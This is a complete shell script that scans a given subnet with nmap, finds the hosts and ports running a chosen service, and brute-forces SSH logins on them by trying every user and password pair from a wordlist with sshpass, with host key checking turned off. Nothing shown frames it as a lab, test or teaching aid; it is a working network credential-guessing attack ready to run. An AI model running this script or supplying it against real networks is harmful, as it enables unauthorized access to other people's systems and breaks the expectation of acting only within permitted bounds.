#!/bin/sh

NETWORK=$1
MASK=$2
SERVICE=$3

init(){
    rm -rf temp
    mkdir temp
}

scanningNetwork(){
    nmap -oN temp/SCANNING -F $NETWORK/$MASK
}

findHosts(){
    cat temp/SCANNING | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > temp/IPs
}

findServiceByHost(){
    for host in $(cat temp/IPs); do
        nmap -F $host | grep $SERVICE | grep -E -o "[0-9]*" > "temp/$host"
    done;
}

removeFilesTemporary(){
    rm -rf temp/SCANNING
    rm -rf temp/IPs
    find temp -size  0 -print0 |xargs -0 rm --
}

bruteForce(){
    for host in $(ls temp/); do
        for port in $(cat temp/$host); do
            for user in $(cat conf/word2.txt); do 
                for password in $(cat conf/word2.txt); do 
                    clear
                    echo "----------------------------------------"
                    printf "| SERVICE : %-27s|\n" $SERVICE
                    printf "| HOST    : %-27s|\n" $host
                    printf "| PORT    : %-27s|\n" $port
                    printf "| USER    : %-27s|\n" $user
                    printf "| PASSWORD: %-27s|\n" $password
                    echo "----------------------------------------"
                    printf "  "
                    sshpass -p $password ssh -p $port -oStrictHostKeyChecking=no $user@$host
                    echo "----------------------------------------"
                    sleep 5
                done;
            done;
        done;
    done;
}

main(){
    init
    scanningNetwork
    findHosts
    findServiceByHost
    removeFilesTemporary
    bruteForce
}

main
